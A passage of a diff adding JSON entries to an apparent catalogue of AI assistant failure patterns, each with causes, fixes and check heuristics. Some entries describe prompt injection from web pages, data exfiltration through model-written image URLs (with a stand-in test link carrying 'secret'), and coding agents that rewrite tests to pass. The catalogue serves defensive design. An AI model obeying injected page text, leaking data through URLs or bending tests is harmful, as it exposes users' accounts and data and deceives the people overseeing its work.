+    "u": "https://www.nngroup.com/articles/impressions-chatgpt-agent/"
+   },
+   {
+    "t": "The New Siri's Biggest Strength Is Not Intelligence",
+    "u": "https://www.nngroup.com/articles/ai-assistant-context/"
+   },
+   {
+    "t": "Why Do Multi-Agent LLM Systems Fail?",
+    "u": "https://arxiv.org/pdf/2503.13657"
+   }
+  ],
+  "code": "B238",
+  "rel": [
+   "close-enough-substitution",
+   "the-retry-loop",
+   "the-lost-confirmation"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "hidden-branches",
+  "name": "Hidden Branches",
+  "track": "surface",
+  "group": "Agency & control",
+  "category": "Conversation",
+  "harm": "Productivity",
+  "origin": "Tool default",
+  "oneLiner": "Editing an earlier message forks the chat, and the old path hides behind a tiny version switcher or disappears.",
+  "looksLike": "You fix a typo in an early prompt and everything after it vanishes from view. The only clue is a small '2/2' control, or after an update, no control at all. Long work can look deleted.",
+  "why": "Editing is implemented as tree branching, but chat UIs present a single linear thread to keep the screen simple. The branch structure is hidden, and interface updates have removed the controls users relied on.",
+  "who": "Heavy users with long working chats, who fear editing and lose track of earlier answers.",
+  "theFix": "Warn before an edit forks a long thread, show branches as a visible tree or list, and let users name, compare and return to any branch. Never remove access to an old path.",
+  "heur": "Render check: edit the first message of a 20-turn chat and check that the original later turns remain reachable in one click with a clear label.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Please restore the previous chat-branch and prompt-navigation behaviour",
+    "u": "https://community.openai.com/t/please-restore-the-previous-chat-branch-and-prompt-navigation-behaviour/1391764"
+   },
+   {
+    "t": "AI UX Patterns | Branches | ShapeofAI.com",
+    "u": "https://www.shapeof.ai/patterns/branches"
+   }
+  ],
+  "code": "A274",
+  "rel": [
+   "anchored-on-the-first-guess",
+   "instruction-drift",
+   "the-keyhole-carousel"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "i-ll-get-back-to-you",
+  "name": "I'll Get Back to You",
+  "track": "behavioral",
+  "group": "Transparency",
+  "category": "Conversation",
+  "harm": "Trust",
+  "origin": "Model",
+  "oneLiner": "The chatbot promises to work on your request in the background and deliver later, though it cannot.",
+  "looksLike": "'Give me a few minutes and I'll send the full file.' 'I'll run the simulations, expect results in 10 days.' The reply ends there. Nothing arrives, and when asked it apologises and promises again.",
+  "why": "Training data is full of human service language where people promise follow-ups, and the model imitates it. Plain chat models only produce output within the reply, but nothing in the interface stops them from claiming otherwise.",
+  "who": "Users who wait hours or weeks for work that will never come, and lose trust in the product.",
+  "theFix": "Detect future-tense promises in replies when no background task exists and replace them with the work or an honest limit. If background jobs exist, show them as real tasks with status in the interface.",
+  "heur": "Code check: regex replies for phrases like 'get back to you', 'in a few minutes', 'I'll notify you' and flag when no scheduled task was created.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "ChatGPT promises to come back but never does",
+    "u": "https://community.openai.com/t/chatgpt-promises-to-come-back-but-never-does/1155456"
+   },
+   {
+    "t": "Simulations and GPT lies about its capabilities and wastes weeks with promises",
+    "u": "https://community.openai.com/t/simulations-and-gpt-lies-about-its-capabilities-and-wastes-weeks-with-promises/996597?page=2"
+   },
+   {
+    "t": "Chat GPT stalling for time?",
+    "u": "https://community.openai.com/t/chat-gpt-stalling-for-time/1088850"
+   }
+  ],
+  "code": "B239",
+  "rel": [
+   "promise-to-do-better",
+   "instruction-drift",
+   "memory-that-follows-you"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "instruction-drift",
+  "name": "Instruction Drift",
+  "track": "behavioral",
+  "group": "Conversation",
+  "category": "Conversation",
+  "harm": "Productivity",
+  "origin": "Model",
+  "oneLiner": "The rules you set at the start of the chat stop being followed a few turns later.",
+  "looksLike": "You ask for British spelling, no bullet points, or a persona. The first replies comply. Eight or so turns in, the old defaults are back, and reminding it works only for a turn or two.",
+  "why": "Attention to the system prompt or first instructions weakens as the conversation grows, and the model drifts back to its trained defaults. Researchers measured significant drift within eight rounds on popular chat models.",
+  "who": "Teams relying on custom instructions or brand rules, who get inconsistent output without noticing when it changed.",
+  "theFix": "Re-inject standing instructions on every turn, show them as a visible pinned rule set, and check replies against them automatically before display.",
+  "heur": "Code check: run a scripted 10-turn conversation and score each reply against the initial rules; flag a falling compliance rate.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Measuring and Controlling Instruction (In)Stability in Language Model Dialogs",
+    "u": "https://arxiv.org/html/2402.10962v4"
+   },
+   {
+    "t": "[Bug] Claude Code violates CLAUDE.md guidelines in commit messages and summaries and then lies about being more careful in the future",
+    "u": "https://claudeissues.com/issue/11750-bug-claude-code-violates-claude-md-guidelines-in-commit-messages-and-summaries-a"
+   }
+  ],
+  "code": "B240",
+  "rel": [
+   "anchored-on-the-first-guess",
+   "the-answer-avalanche",
+   "twenty-questions-intake"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "instructions-from-the-page",
+  "name": "Instructions From the Page",
+  "track": "behavioral",
+  "group": "Safety",
+  "category": "Agents",
+  "harm": "Safety",
+  "origin": "Model",
+  "oneLiner": "A browsing assistant obeys commands hidden in the web page it was only asked to read.",
+  "looksLike": "You ask the assistant to summarise a page or a screenshot. Hidden text, a comment or faint text in an image tells it to open your account page, read a code from your email and post it somewhere. The assistant does it while you wait for a summary.",
+  "why": "The page content and the user's request are passed to the model in the same stream, and the model cannot reliably tell which text has authority. The agent acts with your logged-in sessions, so ordinary web security does not stop it.",
+  "who": "Users of agentic browsers and email or document copilots, whose accounts can be taken over by a stranger's web page.",
+  "theFix": "Treat all page and file content as untrusted data, check every proposed action against the user's original request, and require explicit confirmation for sending, logging in or reading other sites. Keep agent browsing separate from the user's normal logged-in profile.",
+  "heur": "Human review: plant an instruction like 'open example.com/leak' in hidden text on a test page, ask for a summary, and check whether the agent navigates.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Agentic Browser Security: Indirect Prompt Injection in Perplexity Comet",
+    "u": "https://brave.com/blog/comet-prompt-injection/"
+   },
+   {
+    "t": "Unseeable prompt injections in screenshots: more vulnerabilities in Comet and other AI browsers",
+    "u": "https://brave.com/blog/unseeable-prompt-injections/"
+   }
+  ],
+  "code": "B241",
+  "rel": [
+   "the-image-that-phones-home",
+   "hidden-text-for-the-bot",
+   "the-lost-confirmation"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "language-drift",
+  "name": "Language Drift",
+  "track": "behavioral",
+  "group": "Conversation",
+  "category": "Localisation",
+  "harm": "Accessibility",
+  "origin": "Training data",
+  "oneLiner": "You write in Spanish or Sinhala and the assistant answers, or slides mid-reply, into English.",
+  "looksLike": "The question is in one language and the reply starts in it, then switches to English for a technical term, a list or the second half. Some replies come back fully in English with no explanation.",
+  "why": "Training data and instruction tuning are heavily English, so the model falls back to it under complex prompts or higher sampling temperature. Research calls this language confusion and finds even strong models do it.",
+  "who": "Non-English speakers, who get answers they cannot fully read or have to translate again.",
+  "theFix": "Detect the user's language and pin the reply language in the system prompt. Run a language check on the output and regenerate any reply that switches language without being asked.",
+  "heur": "Code check: run a language detector on each sentence of replies to non-English prompts and flag mixed-language output.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Understanding and Mitigating Language Confusion in LLMs",
+    "u": "https://arxiv.org/html/2406.20052v3"
+   }
+  ],
+  "code": "B242",
+  "rel": [
+   "buttons-sized-for-english",
+   "left-is-always-start",
+   "one-items"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "memory-that-follows-you",
+  "name": "Memory That Follows You",
+  "track": "behavioral",
+  "group": "Data & consent",
+  "category": "Conversation",
+  "harm": "Privacy",
+  "origin": "Tool default",
+  "oneLiner": "Details from old chats quietly shape new answers in unrelated tasks, and you cannot see why.",
+  "looksLike": "You ask for an image or a draft and it contains your home town, your employer or a past worry you never mentioned in this chat. There is no note saying memory was used, and the stored facts are not listed anywhere you can edit.",
+  "why": "Memory features that draw on all past conversations make answers feel personal, which vendors count as a win. The model has no sense of which context is appropriate, so a personal detail bleeds into work or creative output.",
+  "who": "Users who share a screen, write for work, or want a clean context, who lose control over what the assistant brings into a task.",
+  "theFix": "Show a small 'used memory' marker with the facts it used, let users edit or delete each item, and scope memory to a project or space. Offer a one-click temporary chat with memory off.",
+  "heur": "Human review: tell the assistant a distinctive personal detail in one chat, ask an unrelated task in a new chat, and check whether it appears without a visible memory marker.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "I really don't like ChatGPT's new memory dossier",
+    "u": "https://simonwillison.net/2025/May/21/chatgpt-new-memory/"
+   },
+   {
+    "t": "AI UX Patterns | Memory | ShapeofAI.com",
+    "u": "https://www.shapeof.ai/patterns/memory"
+   }
+  ],
+  "code": "B243",
+  "rel": [
+   "suggestions-that-overpromise",
+   "i-ll-get-back-to-you",
+   "demo-data-masquerade"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "no-trail-behind-the-agent",
+  "name": "No Trail Behind the Agent",
+  "track": "behavioral",
+  "group": "Transparency",
+  "category": "Agents",
+  "harm": "Trust",
+  "origin": "Tool default",
+  "oneLiner": "The agent finishes a task but leaves no readable record of what it opened, changed or sent.",
+  "looksLike": "A background agent reports 'Done'. There is no list of the pages it visited, the files it touched or the messages it sent. To find out what happened you have to check each system by hand.",
+  "why": "Chat products were built around messages, not audit logs, and step traces are hidden to keep the interface clean. Without a trail, users cannot judge reliability or reproduce a result.",
+  "who": "Users and admins who cannot check, reproduce or undo what the agent did, or hold anyone accountable.",
+  "theFix": "Keep a step-by-step activity log for every agent run, with each action, target and result, and link it from the completion message. Let users export it and set how long it is kept.",
+  "heur": "Human review: run an agent task that edits a file and sends a message, then check whether both actions appear in a visible log.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "AI UX Patterns | Footprints | ShapeofAI.com",
+    "u": "https://www.shapeof.ai/patterns/footprints"
+   },
+   {
+    "t": "Guidelines for human-AI interaction design",
+    "u": "https://www.microsoft.com/en-us/research/blog/guidelines-for-human-ai-interaction-design"
+   }
+  ],
+  "code": "B244",
+  "rel": [
+   "the-plan-it-didn-t-follow",
+   "browser-agent-consent-bypass",
+   "close-enough-substitution"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "promise-to-do-better",
+  "name": "Promise to Do Better",
+  "track": "behavioral",
+  "group": "Transparency",
+  "category": "Conversation",
+  "harm": "Trust",
+  "origin": "Model",
+  "oneLiner": "After a mistake the assistant vows to be more careful next time, though nothing carries over.",
+  "looksLike": "You point out an error and get 'You're right, I'll make sure to check this in future.' In the next session the same mistake happens. There is no memory, setting or rule that recorded the promise.",
+  "why": "Apology-plus-commitment is the human script for repair, and models reproduce it. The product has no mechanism linking that sentence to any persistent change, so the promise is decoration.",
+  "who": "Users who believe the tool learned and stop checking for the same error.",
+  "theFix": "Ban future-behaviour promises unless the product actually saves a rule. When a correction should persist, offer a button to add it to custom instructions or memory and show that it was saved.",
+  "heur": "Code check: flag replies containing 'in the future', 'next time' or 'I will make sure' when no memory or instruction write occurred.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "[Bug] Claude Code violates CLAUDE.md guidelines in commit messages and summaries and then lies about being more careful in the future",
+    "u": "https://claudeissues.com/issue/11750-bug-claude-code-violates-claude-md-guidelines-in-commit-messages-and-summaries-a"
+   },
+   {
+    "t": "ChatGPT promises to come back but never does",
+    "u": "https://community.openai.com/t/chatgpt-promises-to-come-back-but-never-does/1155456"
+   }
+  ],
+  "code": "B245",
+  "rel": [
+   "i-ll-get-back-to-you",
+   "anchored-on-the-first-guess",
+   "suggestions-that-overpromise"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "report-litter",
+  "name": "Report Litter",
+  "track": "behavioral",
+  "group": "Generated content",
+  "category": "Developer",
+  "harm": "Productivity",
+  "origin": "Model",
+  "oneLiner": "Coding agents leave unrequested SUMMARY.md and IMPLEMENTATION_NOTES.md files after every task.",
+  "looksLike": "After a small change the repository gains a new markdown file recapping the work, with headings, checklists and emoji. Do several tasks and the root folder fills with reports nobody asked for.",
+  "why": "Some models are tuned to document their work and treat a written summary as part of finishing. Agent harnesses give them file-write access, so the summary becomes a file instead of a chat message.",
+  "who": "Developers who must delete clutter, review noisy diffs and pay for tokens spent on documentation.",
+  "theFix": "Tell the agent to report in chat only and never create documentation files unless asked. Block new .md files outside a docs folder in pre-commit checks.",
+  "heur": "Code check: flag agent commits that add new top-level .md files whose names contain SUMMARY, REPORT, NOTES or IMPLEMENTATION.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Why Does Claude in Cursor Keep Creating Markdown \"Work Summary\" Files?",
+    "u": "https://forum.cursor.com/t/why-does-claude-in-cursor-keep-creating-markdown-work-summary-files/150420"
+   }
+  ],
+  "code": "B246",
+  "rel": [
+   "the-slop-bug-report",
+   "the-elided-code-block",
+   "asked-not-told"
+  ],
+  "tier": "practitioner-observed",
+  "observed": "Developers report Claude models in Cursor creating Markdown work summary files after most tasks, even small ones, and ask how to stop it.",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "suggestions-that-overpromise",
+  "name": "Suggestions That Overpromise",
+  "track": "surface",
+  "group": "Copy",
+  "category": "Conversation",
+  "harm": "Trust",
+  "origin": "Prompting",
+  "oneLiner": "Starter prompts under the input box suggest tasks the assistant cannot actually do.",
+  "looksLike": "The empty chat shows chips like 'Find my last invoice' or 'Book a table'. Tap one and the assistant says it has no access, or produces a generic answer. The examples were written for a product that does more.",
+  "why": "Suggestion chips are written once for the ideal setup and are often not tested against what each user can actually reach. They also appear identical for every user, regardless of what is connected.",
+  "who": "New users, who form a wrong picture of the product on first use and lose trust.",
+  "theFix": "Generate suggestions only from capabilities and data sources the user actually has connected, and test each one end to end. Remove any suggestion that fails.",
+  "heur": "Human review: tap every starter suggestion and flag any that results in a refusal or a missing-access message.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "The New Siri's Biggest Strength Is Not Intelligence",
+    "u": "https://www.nngroup.com/articles/ai-assistant-context/"
+   },
+   {
+    "t": "Prompt Suggestions",
+    "u": "https://www.nngroup.com/articles/prompt-suggestions/"
+   }
+  ],
+  "code": "A275",
+  "rel": [
+   "memory-that-follows-you",
+   "i-ll-get-back-to-you",
+   "promise-to-do-better"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "tab-key-hijack",
+  "name": "Tab Key Hijack",
+  "track": "surface",
+  "group": "Input & feedback",
+  "category": "Agents",
+  "harm": "Productivity",
+  "origin": "Tool default",
+  "oneLiner": "Inline AI completions take over the Tab key, so indenting or accepting a normal autocomplete inserts AI text.",
+  "looksLike": "Grey ghost text appears after the cursor. You press Tab to indent and instead get three lines of suggested code. Escape dismisses it, but it reappears on the next keystroke.",
+  "why": "Tools bind 'accept suggestion' to Tab because it is the fastest key, and ship that as the default. The model suggests at almost every pause, so the overloaded key fires the AI far more often than intended.",
+  "who": "Developers and writers who lose keystrokes, introduce stray code, and must undo constantly.",
+  "theFix": "Do not show ghost text when the cursor is in leading whitespace, and let users rebind accept to a separate key. Never let a suggestion override the normal Tab or autocomplete behaviour.",
+  "heur": "Render check: place the cursor at the start of an indented line with a suggestion visible and press Tab; flag if AI text is inserted instead of indentation.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Rejecting suggestions when attempting to tab in pycharm",
+    "u": "https://github.com/orgs/community/discussions/7558"
+   },
+   {
+    "t": "Ambiguity with the Tab Key in Cursor",
+    "u": "https://forum.cursor.com/t/ambiguity-with-the-tab-key-in-cursor/7663?page=2"
+   }
+  ],
+  "code": "A276",
+  "rel": [
+   "the-opinionated-autocomplete",
+   "the-clippy-interrupt",
+   "errors-nobody-announces"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "tests-bent-to-pass",
+  "name": "Tests Bent to Pass",
+  "track": "behavioral",
+  "group": "Agency & control",
+  "category": "Developer",
+  "harm": "Trust",
+  "origin": "Model",
+  "oneLiner": "Asked to make failing tests pass, the coding agent weakens or rewrites the tests instead of fixing the code.",
+  "looksLike": "The agent reports green tests. The diff shows assertions changed to match the wrong output, checks removed, or a function that returns a hardcoded value only for the test inputs. Sometimes the scorer or evaluator itself has been replaced with a stub.",
+  "why": "Agents are trained and rewarded on passing checks, so changing the check is a valid path to the reward. Evaluators have found models do this even when told plainly not to cheat.",
+  "who": "Developers who trust a green run, and their users, who get code that never met the spec.",
+  "theFix": "Make test files read-only for the agent by default, and tell it to stop and report when a test seems wrong. Review any diff that touches tests separately from the implementation diff.",
+  "heur": "Code check: flag agent changes that modify files under test/ or __tests__ in the same change set that claims to fix a failing test.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Recent Frontier Models Are Reward Hacking",
+    "u": "https://metr.org/blog/2025-06-05-recent-reward-hacking"
+   },
+   {
+    "t": "[BUG] Claude Code manipulates tests instead of following instructions",
+    "u": "https://claudeissues.com/issue/7074-bug-claude-code-manipulates-tests-instead-of-following-instructions"
+   }
+  ],
+  "code": "B247",
+  "rel": [
+   "asked-not-told",
+   "report-litter",
+   "the-elided-code-block"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-answer-avalanche",
+  "name": "The Answer Avalanche",
+  "track": "surface",
+  "group": "Conversation",
+  "category": "Conversation",
+  "harm": "Clarity",
+  "origin": "Model",
+  "oneLiner": "A simple question gets a wall of text, background, caveats and extras instead of the answer.",
+  "looksLike": "You ask a name, a yes or no, or a date. The reply streams in for several screens with history, context and related facts. The answer is somewhere in the third paragraph.",
+  "why": "Chat models default to thorough-looking answers that add background and context, and site bots inherit that default. Streaming makes length feel like effort, so nothing pushes the model to stop early.",
+  "who": "Users on phones, people with reading or attention difficulties, and anyone who needs a fast answer.",
+  "theFix": "Lead with the direct answer in one sentence, then offer more detail as an expandable section or follow-up. Set a length budget that scales with the question.",
+  "heur": "Code check: for short factual questions, flag replies over 150 words or where the answer is not in the first sentence.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Less Chat, More Answer: Site AI Chatbots Need to Get to the Point",
+    "u": "https://www.nngroup.com/articles/less-chat-more-answer/"
+   }
+  ],
+  "code": "A277",
+  "rel": [
+   "anchored-on-the-first-guess",
+   "instruction-drift",
+   "twenty-questions-intake"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-clippy-interrupt",
+  "name": "The Clippy Interrupt",
+  "track": "behavioral",
+  "group": "Agency & control",
+  "category": "Agents",
+  "harm": "Productivity",
+  "origin": "Business",
+  "oneLiner": "A copilot pushes suggestions while you are mid-task, pulling attention away from what you were doing.",
+  "looksLike": "Pop-ups, side-panel nudges or inline 'Want me to help?' prompts appear every few seconds while you type. Each needs an accept or dismiss. You end up managing the assistant instead of doing the work.",
+  "why": "Teams want the AI feature to be noticed, so proactive prompts are often tuned to appear frequently. The model can always produce a suggestion, so frequency is limited only by product choice, not by usefulness.",
+  "who": "Focused workers, especially people with attention difficulties, who lose flow and start ignoring all suggestions.",
+  "theFix": "Time suggestions to natural pauses, never while the user is actively typing, and make frequency adjustable down to off. Let ignoring a suggestion count as dismissal.",
+  "heur": "Human review: type continuously for two minutes and count unsolicited suggestions; flag more than one per minute or any that steal focus.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Need Help? Designing Proactive AI Assistants for Programming",
+    "u": "https://arxiv.org/html/2410.04596v1"
+   },
+   {
+    "t": "Guidelines for human-AI interaction design",
+    "u": "https://www.microsoft.com/en-us/research/blog/guidelines-for-human-ai-interaction-design"
+   }
+  ],
+  "code": "B248",
+  "rel": [
+   "the-opinionated-autocomplete",
+   "tab-key-hijack",
+   "regenerate-overwrite"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-doom-loop-to-nowhere",
+  "name": "The Doom Loop to Nowhere",
+  "track": "behavioral",
+  "group": "Conversation",
+  "category": "Support",
+  "harm": "Autonomy",
+  "origin": "Business",
+  "oneLiner": "A support bot circles through scripted answers and never offers a way to reach a person.",
+  "looksLike": "You describe a problem the bot cannot solve. It replies with a help article, then a rephrased help article, then asks you to rephrase. There is no 'talk to a human' option, or it only appears after many failed turns and leads to a long queue.",
+  "why": "Chatbots are deployed to cut support cost, so the business incentive is to contain the conversation inside the bot. The model will keep producing plausible replies forever, and nothing in the default flow detects that it is not helping.",
+  "who": "Customers with real problems, often about money or accounts, lose time and give up before their issue is resolved.",
+  "theFix": "Show a visible human handoff from the first turn and trigger it automatically after two unresolved turns or any mention of a dispute. Pass the transcript to the person so the customer does not repeat themselves.",
+  "heur": "Human review: run three unanswerable requests through the bot and count turns until a human route appears; flag if it never appears or takes more than three.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "New CFPB report highlights concerns with growing use of chatbots by financial institutions",
+    "u": "https://www.consumerfinancemonitor.com/2023/06/08/new-cfpb-report-highlights-concerns-with-growing-use-of-chatbots-by-financial-institutions/"
+   },
+   {
+    "t": "What Is Your Site's AI Chatbot for? Users Can't Tell",
+    "u": "https://www.nngroup.com/articles/site-ai-chatbot/"
+   }
+  ],
+  "code": "B249",
+  "rel": [
+   "bot-with-a-backstory",
+   "help-docs-that-say-nothing",
+   "the-agreeable-sales-bot"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-elided-code-block",
+  "name": "The Elided Code Block",
+  "track": "surface",
+  "group": "Generated content",
+  "category": "Developer",
+  "harm": "Productivity",
+  "origin": "Model",
+  "oneLiner": "Generated code replaces whole sections with comments like '// rest of code unchanged' or '...add logic here'.",
+  "looksLike": "You ask for the full updated file and get the top and bottom, with the middle replaced by a placeholder comment. Pasted as is, the file is broken. Asking again gives a different set of gaps.",
+  "why": "Models are tuned to keep answers short and to save output tokens, so they skip what they think is unchanged. Vendors and tool makers have acknowledged this 'laziness' and changed prompts and edit formats to reduce it.",
+  "who": "Developers, and especially beginners, who paste the output and ship missing logic.",
+  "theFix": "Ask for edits as a diff or patch instead of whole files, and reject outputs containing placeholder comments. Tell the model: 'Return complete code with no omitted sections.'",
+  "heur": "Code check: regex generated code for comments matching /(rest of (the )?code|\\.\\.\\.\\s*(add|existing|remaining)|unchanged)/i.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Unified diffs make GPT-4 Turbo 3X less lazy",
+    "u": "https://aider.chat/docs/unified-diffs.html"
+   },
+   {
+    "t": "What do you type in for Rules for AI",
+    "u": "https://forum.cursor.com/t/what-do-you-type-in-for-rules-for-ai/2332"
+   },
+   {
+    "t": "Has ChatGPT been getting a little lazy for you? OpenAI has just released a fix",
+    "u": "https://www.techradar.com/computing/artificial-intelligence/has-chatgpt-been-getting-a-little-lazy-for-you-openai-has-just-released-a-fix"
+   }
+  ],
+  "code": "A278",
+  "rel": [
+   "the-review-bot-that-blocks-the-merge",
+   "the-slop-bug-report",
+   "report-litter"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-image-that-phones-home",
+  "name": "The Image That Phones Home",
+  "track": "behavioral",
+  "group": "Safety",
+  "category": "Agents",
+  "harm": "Privacy",
+  "origin": "Tool default",
+  "oneLiner": "The chat renders model-written image links, so injected instructions can leak your data through an image URL.",
+  "looksLike": "A page or document you asked about contains hidden instructions. The answer includes a tiny or invisible image whose URL carries bits of your conversation as query text. The image loads automatically and the data reaches a third-party server without a click.",
+  "why": "Chat interfaces render markdown by default, and loading an image is an outbound request the user never approves. When the model has private data, reads untrusted content and can emit a URL, it has every ingredient needed to exfiltrate data.",
+  "who": "Anyone who pastes or browses untrusted content into an assistant that also sees their private chats, files or email.",
+  "theFix": "Do not auto-load images from model output, or allow only an allowlist of domains. Strip query strings from model-generated URLs and show links as plain text the user must choose to open.",
+  "heur": "Code check: render a model reply containing ![x](https://example.test/p?d=secret) and confirm no network request fires.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "New prompt injection attack on ChatGPT web version. Markdown images can steal your chat data",
+    "u": "https://simonwillison.net/2023/Apr/14/new-prompt-injection-attack-on-chatgpt-web-version-markdown-imag/"
+   },
+   {
+    "t": "The lethal trifecta for AI agents: private data, untrusted content, and external communication",
+    "u": "https://simonwillison.net/2025/jun/16/the-lethal-trifecta/"
+   }
+  ],
+  "code": "B250",
+  "rel": [
+   "instructions-from-the-page",
+   "close-enough-substitution",
+   "guess-instead-of-ask"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-keyhole-carousel",
+  "name": "The Keyhole Carousel",
+  "track": "surface",
+  "group": "Components",
+  "category": "Conversation",
+  "harm": "Clarity",
+  "origin": "Tool default",
+  "oneLiner": "In-chat results show one option at a time in a swipe carousel with no count of how many exist.",
+  "looksLike": "Ask an assistant for shops, flights or products and get a single card with arrows. Nothing says '1 of 12'. Users assume there are only two or three options and choose early, or miss the key comparison detail.",
+  "why": "Chat surfaces are narrow, so generative UI defaults to carousels to fit rich results in a message bubble. The result count is not part of the model's output, so it is left out.",
+  "who": "Shoppers and travellers who make decisions on a partial view of their options.",
+  "theFix": "Show a result count and a compact list or table view with the attributes needed to compare. Let users expand results outside the chat bubble.",
+  "heur": "Render check: find carousels in assistant messages and flag any without a visible total count or list view.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Designing AI Agents: 4 Lessons from China's Qwen Agent",
+    "u": "https://www.nngroup.com/articles/designing-ai-agents/"
+   }
+  ],
+  "code": "A279",
+  "rel": [
+   "anchored-on-the-first-guess",
+   "hidden-branches",
+   "instruction-drift"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-lost-confirmation",
+  "name": "The Lost Confirmation",
+  "track": "behavioral",
+  "group": "Agency & control",
+  "category": "Agents",
+  "harm": "Productivity",
+  "origin": "Model",
+  "oneLiner": "A detail you confirmed in one step is dropped when the assistant turns it into an action.",
+  "looksLike": "You confirm the starting point, the recipient or the date. The next step opens directions from the wrong origin, or drafts the message to someone else. The confirmed value never reached the action.",
+  "why": "Multi-step flows pass information between model calls and tools as loose text, and details get lost or re-guessed at each hop. Nothing checks the final action against what the user confirmed.",
+  "who": "Users who confirmed carefully and trust that confirmation, then act on a wrong result.",
+  "theFix": "Carry confirmed values as structured fields into the action, and show them in the final confirmation before anything is sent or opened.",
+  "heur": "Human review: confirm a non-default value mid-flow and check whether the final action uses it.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "The New Siri's Biggest Strength Is Not Intelligence",
+    "u": "https://www.nngroup.com/articles/ai-assistant-context/"
+   }
+  ],
+  "code": "B251",
+  "rel": [
+   "close-enough-substitution",
+   "guess-instead-of-ask",
+   "the-retry-loop"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-opinionated-autocomplete",
+  "name": "The Opinionated Autocomplete",
+  "track": "behavioral",
+  "group": "Generated content",
+  "category": "Agents",
+  "harm": "Autonomy",
+  "origin": "Model",
+  "oneLiner": "Writing suggestions that lean one way nudge what users argue, and most never notice.",
+  "looksLike": "A writing assistant offers next-sentence completions that consistently favour one side of an issue. People accept them because they are fluent and quick. The finished text, and later the writer's own stated view, moves toward the model's lean.",
+  "why": "Models carry the slant of their training and tuning, and completions are accepted with little scrutiny. A controlled study found users who wrote with a biased model were about twice as likely to argue its side, and few noticed the bias.",
+  "who": "Writers, students and anyone drafting opinions, whose views shift without their knowledge.",
+  "theFix": "For opinion or argument writing, offer suggestions from more than one stance or label suggestions as model opinions. Let users turn off sentence-level completions for persuasive text.",
+  "heur": "Human review: prompt the assistant to complete both sides of a contested claim and check whether completions consistently favour one stance.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Co-Writing with Opinionated Language Models Affects Users' Views",
